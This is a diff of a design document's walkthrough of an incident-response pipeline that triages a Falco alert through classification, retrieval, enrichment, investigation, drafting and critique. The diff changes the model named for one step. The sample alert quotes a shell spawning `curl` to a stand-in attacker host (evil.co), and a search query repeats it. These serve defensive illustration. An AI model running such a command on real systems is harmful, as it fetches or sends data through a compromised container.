@@ -228,7 +228,7 @@ A Falco syscall alert arrives: `svc-n8n` spawned `/bin/sh -c curl http://evil.co
 4. **Classify node** (Row 10 model routing enforces Sonnet 4.6) returns `severity=HIGH`, `category=execution`.
 5. **Retrieve node** (Row 6 pgvector isolation) pulls six chunks from `ir_chunks` covering `PLAYBOOK_COMPROMISED_CONTAINER.md`, `POLICY_INCIDENT_RESPONSE.md`, and two Falco rule references.
 6. **Enrich node** queries Tavily for `curl evil.com shell injection`.
-7. **Investigate node** (Row 10 Opus 4.8) synthesizes narrative. Row 9 iteration cap is 3; investigate uses 1 pass.
+7. **Investigate node** (Row 10 Fable 5) synthesizes narrative. Row 9 iteration cap is 3; investigate uses 1 pass.
 8. **Draft node** produces final narrative. Row 4 NeMo input rail runs before the call; no block. Row 5 NeMo output rail runs after; no block.
 9. **Critique node** runs. Row 11 citation guard passes: four citations (IR-4, TA0002/T1059, MG-4.3, LLM07) all shape-valid and provenance-valid. Severity HIGH is consistent with classifier. No action verbs need rewriting.
 10. **Row 2** Langfuse trace is complete with cost $0.37 (Row 7 under $0.75 ceiling). Row 18 latency 18 seconds (under 45s). Response returned.
